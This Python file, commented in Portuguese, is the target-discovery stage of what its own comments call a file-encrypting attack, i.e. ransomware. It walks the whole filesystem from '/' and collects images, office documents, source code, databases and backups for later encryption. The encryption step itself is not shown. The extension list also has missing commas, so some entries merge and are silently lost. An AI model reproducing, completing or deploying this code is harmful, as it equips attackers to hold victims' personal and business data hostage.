#!/usr/bin/python3.6
import os


def discover(initial_path):
    '''
    Caminha recursivamente à partir do caminho inicial, especificado pelo
    :initial_path: é a pasta raíz ou inicial, onde os arquivos deverão 
        ser descobertos e listados para depois serem encryptados.

    Atenção: 
      - Nenhuma verificação de error é feita neste código 
        no processo atual é assumido que o usuário atual 
        tem permissão de leitura, execução e escrita.
    '''

    # Lista de extensões de arquivos que podem ser encryptados
    # geralmente num ataque a um sistema, o atacante precisa
    # definir qual parte do sistema ele quer atacar (ou tudo)

    extensions = [
        # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img'  # Arquivos do Sitema
        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw',  # imagens
        'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape',  # Audios
        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',  # Vídeos
        'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',  # Microsoft office
        # OpenOffice, Adobe, Latex, Markdown, etc
        'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md',
        'yml', 'yaml', 'json', 'xml', 'csv',  # dados estruturados e config
        'db', 'sql', 'dbf', 'mdb', 'iso',  # bancos de dados e imagens de disco

        'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css'  # tecnologias web
        'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',  # Código fonte C e C++
        'java', 'class', 'jar'  # Códigos fonte Java
        'ps', 'bat', 'vb',  # Scripts de sistemas windows
        'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',  # Scripts de sistemas unix
        'go', 'py', 'pyc', 'bf', 'coffee',  # Outros tipos de códigos fonte

        'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # Arquivos compactados e Backups
    ]

    # dirpath - caminho atual
    # dirs - pastas no caminho atual
    # files - arquivos no caminho atual
    for dirpath, dirs, files in os.walk(initial_path):
        for _file in files:
            absolute_path = os.path.abspath(os.path.join(dirpath, _file))
            ext = absolute_path.split('.')[-1]
            if ext in extensions:
                yield absolute_path


# isto só é executado caso você rode este arquivo diretamente
if __name__ == '__main__':
    x = discover('/')
    for i in x:
        print(i)
